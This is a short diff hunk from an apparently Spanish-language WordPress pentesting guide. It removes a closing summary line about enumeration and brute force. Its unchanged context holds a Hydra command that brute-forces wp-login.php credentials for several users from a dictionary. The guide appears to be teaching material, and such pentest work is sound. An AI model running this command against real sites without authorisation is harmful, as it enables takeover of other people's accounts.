@@ -121,8 +121,6 @@ Ataque a múltiples usuarios:
 hydra -L <lista_usuarios.txt> -P <diccionario.txt> <url> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"
 ```
 
-🏁 Con estos métodos, podemos identificar la versión de WordPress utilizada, detectar plugins y temas instalados, analizar directorios sensibles, localizar paneles de acceso y ejecutar ataques de fuerza bruta para intentar obtener acceso al sistema.
-
 ---
 
 
